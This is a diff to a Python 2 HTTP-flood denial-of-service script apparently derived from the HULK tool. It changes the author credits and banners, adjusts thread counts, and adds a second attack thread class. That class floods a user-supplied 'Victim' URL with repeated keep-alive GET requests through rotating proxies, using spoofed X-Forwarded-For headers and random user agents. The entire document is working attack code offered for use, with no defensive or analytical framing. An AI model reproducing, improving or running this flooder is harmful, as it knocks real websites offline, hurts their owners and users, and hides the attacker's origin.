@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #coding: utf-8
-#..:: > DIE_v8 < ::.. Mod By Phan
+#..:: > DDoS < ::.. Mod By DDoS-Webstie
 
 import random
 import socket
@@ -15,7 +15,7 @@ import optparse
 import os
 import urlparse
 
-#Hulk Mod By JokerLjnk
+#Hulk Mod By Hùng
 url=''
 host=''
 headers_useragents=[]
@@ -126,7 +126,7 @@ def buildblock(size):
 
 def httpcall(url):
 	referer_list()
-	code=0
+	Mod=0
 	if url.count("?")>0:
 		param_joiner = "&"
 	else:
@@ -147,24 +147,24 @@ def httpcall(url):
 	try:
 			urllib2.urlopen(request)
 			if(flag==1): set_flag(0)
-			if(code==500): code=0
+			if(Mod==500): Mod=0
 	except urllib2.HTTPError, e:
 			set_flag(1)
-			code=500
+			Mod=500
 			time.sleep(60)
 	except urllib2.URLError, e:
 			sys.exit()
 	else:
 			inc_counter()
 			urllib2.urlopen(request)
-	return(code)
+	return(Mod)
 
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
 			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
+				Mod=httpcall(url)
+				if (Mod==500) & (safe==1):
 					set_flag(2)
 		except Exception, ex:
 			pass
@@ -178,7 +178,7 @@ class MonitorThread(threading.Thread):
 			if flag==2:
 				print ''
 
-#DIE_v8 Mod By Duong Th�nh
+#Joker Mod By Hùng
 def randomIp():
     random.seed()
     result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
@@ -188,7 +188,7 @@ def randomIp():
 def randomIpList():
     random.seed()
     res = ""
-    for ip in xrange(random.randint(8, 10)):
+    for ip in xrange(random.randint(9, 10)):
         res = res + randomIp() + ", "
     return res[0:len(res) - 2]
 class attacco(threading.Thread):
@@ -203,7 +203,7 @@ class attacco(threading.Thread):
  
         useragent = "User-Agent: " + getUserAgent() + "\r\n"
         forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
-        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1500)) +  "\r\n"
+        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1000)) +  "\r\n"
         httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
         while nload:
@@ -225,9 +225,41 @@ class attacco(threading.Thread):
             except:
                 proxy = random.choice(listaproxy).split(':')
 
+class attacco1(threading.Thread):
+    def run(self):
+        current = x
+       
+        if current < len(listaproxy):
+            proxy = listaproxy[current].split(':')
+        else:
+            proxy = random.choice(listaproxy).split(':')
+ 
+        useragent = "User-Agent: " + getUserAgent() + "\r\n"
+        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
+        httprequest = get_host + useragent + accept + forward + connection + "\r\n"
+
+        while nload:
+        	time.sleep(1)
+        	pass
+           
+        while 1:
+            try:
+                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                a.connect((proxy[0], int(proxy[1])))
+                a.send(httprequest)
+                try:
+                    for i in xrange(4):
+                        a.send(httprequest)
+                except:
+                    tts = 1
+ 
+                   
+            except:
+                proxy = random.choice(listaproxy).split(':')
+
 #Main
-print '\n\t..:: > Edit Code By Phan < ::..'
-print '\t  ==> #~~  Ddos Super ~~# <==  '
+print '\n\t..:: > Mod By DDoS < ::..'
+print '\t  ==> #~~ DDOS-Webstie ~~# <==  '
 # Site
 url = raw_input("Victim: ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
@@ -239,19 +271,20 @@ proxyf = in_file.read()
 in_file.close()
 listaproxy = proxyf.split('\n')
 #So luong
-thread = input("So luong (3000): ")
+thread = input("So luong (2000): ")
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
 nload = 1
 x = 0
-print("\tDIE_v8 DDOS Edit By Phan")
+print("\tJoker DDOS Mod By DDoS-Webstie")
 if url.count("/")==2:
     url = url + "/"
     m = re.search('http\://([^/]*)/?.*', url)
     host = m.group(1)
 for x in xrange(int(thread + 1)):
     attacco().start()
+    attacco1().start()
     time.sleep(0.003)
 print "Attacking ==========================>>"
 for x in xrange(501):
